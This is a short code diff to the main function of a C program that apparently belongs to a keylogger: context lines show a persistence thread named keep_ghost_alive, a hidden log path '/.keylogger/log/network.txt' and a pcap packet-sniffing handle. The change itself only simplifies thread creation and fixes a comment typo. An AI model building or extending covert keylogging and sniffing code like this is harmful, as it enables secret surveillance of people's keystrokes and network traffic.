@@ -31,11 +31,8 @@ int main(int argc, char **argv)
     if (argc >= 2)
         id = atoi(argv[1]);
 
-    pthread_attr_t attr;
-    pthread_attr_init(&attr);
-
     pthread_t aliver;
-    pthread_create(&aliver, &attr, keep_ghost_alive, &id);
+    pthread_create(&aliver, NULL, keep_ghost_alive, &id);
 
     FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
     if (network_log == NULL)
@@ -70,7 +67,7 @@ int main(int argc, char **argv)
         exit(1);
     }
 
-    /* Create a handle to start sniffint packets in non promiscuous
+    /* Create a handle to start sniffing packets in non promiscuous
        mode. */
     handle = pcap_open_live(dev, 1518, true, 1000, errbuf);
     if (handle == NULL)
